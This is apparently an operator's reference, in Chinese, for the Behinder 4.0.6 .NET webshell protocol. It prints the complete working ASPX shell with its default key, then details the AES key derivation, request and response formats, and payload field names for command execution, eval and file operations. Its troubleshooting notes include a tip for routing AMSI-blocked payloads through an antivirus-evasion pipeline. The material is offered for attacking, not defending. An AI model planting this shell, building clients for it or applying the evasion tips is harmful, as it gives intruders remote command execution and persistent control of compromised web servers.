# 冰蝎 (Behinder) 4.0.6 .NET 协议

## Shell 模板（server/shell.aspx，各版本通用）
```
<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b"); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
```
- 密钥写死在 `Session.Add("k", ...)`，每个新会话重建 → **无需握手、无 cookie 依赖**
- `Session[0]` 是**按索引取第一个会话项**（不是键 "0"）
- 默认密码 rebeyond → 密钥 e45e329feb5d925b

## 密钥派生（客户端与马一致）
- `key = MD5(password).hexdigest()[:16]` 的 ASCII 字节（16 字节）
  - 例：Aa123456 → afdd0b4ad2ec172c
- 加密：**AES-128-CBC，IV = key，PKCS7**，裸二进制 POST body（Content-Type: application/octet-stream）
- 混淆马可能用 Encoding.Default 取字节（服务端 Windows-1252/UTF-8 对 ASCII 密钥无影响）

## 载荷请求格式（客户端 → 马）
```
body = [payload DLL 字节] + "~~~~~~"(0x7E×6) + "字段:base64(值),字段2:base64(值2),..."
整体 AES 加密后作为 POST body
```
- 客户端**不改 DLL**，只是把参数追加在 DLL 后面
- DLL 自身必须含一个 0x7E×6 字节序列（编译器会把 `new byte[]{126,126,126,126,126,126}` 常量数组嵌入 PE → 重编译版自动满足）
- 载荷 U 类逻辑：fillParams → 解密 → 找**第 2 个** 0x7E×6 → 切出参数 → `GetType().GetField(key).SetValue` 反射赋值

## 响应格式（马 → 客户端）
- 混淆马响应带明文前缀：`Welcome You!<html>\n</html>\n{;}\n`（解密前必须剥掉；干净原版马无此前缀）
- 载荷执行后 `Response.BinaryWrite(加密JSON)`，JSON 形如 `{"status":"success","msg":"base64(输出)"}`（值全 base64）
- 响应密文长度不定，解密时枚举 PKCS7 pad 1..16 找能解出 JSON 的

## 各载荷字段（客户端反射赋值目标，必须保留原名）
- Cmd: cmd / path / sessionId
- BasicInfo: sessionId（不带会报 Base64 FormatException）
- Echo: content / sessionId
- Eval: code / sessionId
- RealCMD: bashPath / type / cmd / whatever / sessionId
- FileOperation: cmd / path / file 等
- 方法名/其他字段可随意改名（客户端不引用）

## 客户端内部结构（排查用）
- 默认协议（transProtocolId=-1）→ LegacyCryptor → AES-CBC（与标准马匹配）
- 自定义协议 → CustomCryptor；aspx 的 default_aes 协议是 **ECB+base64**，选了必挂（与标准马不兼容）
- shells 表可手工插入标准条目：url/ip/password/type=aspx/transProtocolId=-1/status=1
- proxys 表存代理（1080=neoreg 隧道、7890=Clash 是常见混淆点）；改 db 前先备份、冰蝎需完全退出否则退出时覆盖

## 常见错误速查
| 现象 | 含义 |
|------|------|
| Padding is invalid | 密钥/加密参数不对，或载荷被截断 |
| Length of the data to decrypt is invalid | 密钥长度合法、已进入解密（15B oracle） |
| 0x800700E1 contains a virus | AMSI 拦载荷 → 走免杀流水线 |
| Specified key/IV not valid size | Session 值为空/长度非法（罕见，马一般有内置默认） |
